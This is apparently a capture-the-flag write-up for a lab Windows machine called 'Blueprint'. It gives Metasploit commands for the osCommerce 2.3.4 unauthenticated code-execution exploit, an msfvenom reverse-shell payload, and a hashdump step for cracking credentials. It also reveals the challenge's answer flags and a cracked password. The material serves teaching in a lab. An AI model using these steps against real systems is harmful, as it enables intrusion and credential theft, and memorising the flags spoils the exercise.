@@ -1,0 +1,144 @@
+
+Blueprint
+
+Hack into this Windows machine and escalate your privileges to Administrator.
+
+Title
+	Blueprint
+
+IP Address
+	10.10.100.209 
+
+
+ [Task 1] Blueprint
+
+
+Do you have what is takes to hack into this Windows Machine?
+
+It might take around 3-4 minutes for the machine to boot.
+
+#1 	
+
+"Lab" user NTML hash decrypted
+...
+googleplus
+...
+
+#2 	
+
+root.txt
+...
+THM{aea1e3ce6fe7f89e10cea833ae009bee}
+...
+
+
+
+Firstly run nmap scanner(see namp scaned file)
+
+here many ports are open first look into the port 8080
+
+open machine ip in new tab 
+
+http://10.10.100.209:8080/
+
+here is a indexed files
+
+there is a folder called osCommerce 2.3.4, after googling this we have found an exploit
+
+lets search for osCommerce 2.3.4 in metasploit
+we have found 
+
+msf5 > search oscommerce 2.3.4
+                                                                                                                                                                                                                                           
+Matching Modules                                                                                                                                                                                                                           
+================                                                                                                                                                                                                                           
+                                                                                                                                                                                                                                           
+   #  Name                                                      Disclosure Date  Rank       Check  Description                                                                                                                             
+   -  ----                                                      ---------------  ----       -----  -----------                                                                                                                             
+   0  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials                                                                                                             
+   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution                                                                                     
+   2  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection                                                                                       
+   3  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution                                                                                                
+   4  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution                                                                                             
+                                                                                                                                                                                                                                           
+
+
+
+use the 1 script
+
+msf5 > use exploit/multi/http/oscommerce_installer_unauth_code_exec
+msf5 exploit(multi/http/oscommerce_installer_unauth_code_exec) > options
+
+Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):
+
+   Name     Current Setting    Required  Description
+   ----     ---------------    --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT    80                 yes       The target port (TCP)
+   SSL      false              no        Negotiate SSL/TLS for outgoing connections
+   URI      /catalog/install/  yes       The path to the install directory
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   osCommerce 2.3.4.1
+
+msf5 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RHOSTS 10.10.100.209
+RHOSTS => 10.10.100.209
+msf5 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RPORT 8080
+RPORT => 8080
+msf5 exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install/
+URI => /oscommerce-2.3.4/catalog/install/
+msf5 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
+
+[*] Started reverse TCP handler on 10.9.4.1:4444 
+[*] Sending stage (38288 bytes) to 10.10.100.209
+[*] Meterpreter session 1 opened (10.9.4.1:4444 -> 10.10.100.209:49445) at 2020-06-28 12:13:41 -0400
+
+meterpreter > ls
+Listing: C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
+==================================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  447   fil   2019-04-11 17:52:45 -0400  application.php
+100666/rw-rw-rw-  2604  fil   2020-06-28 12:13:29 -0400  configure.php
+40777/rwxrwxrwx   4096  dir   2019-04-11 17:52:45 -0400  functions
+
+
+we will get a meterpreter session 
+but this session is not stable
+
+So we will create a payload and upload it using the meterpreter session
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+open another tab and run metasploit
+
+    use handler and and run it
+
+on the previous meterpreter session
+run: 
+execute -f shell.exe
+
+and we will get a new meterpreter session that is stable
+run:
+
+hashdump
+to look for hashes and crack them online using htts://crackstation.net
+
+    Lab user hash
+
+    Lab:1000:aad3b435b51404eeaad3b435b51404ee:??????????????????????:::						//flag1
+
+    go????????
+
+    root flag
+
+navigate to C:\Users\Administrator\Desktop cat the root flag
+
+    THM{????????????????????9bee}															//flag2
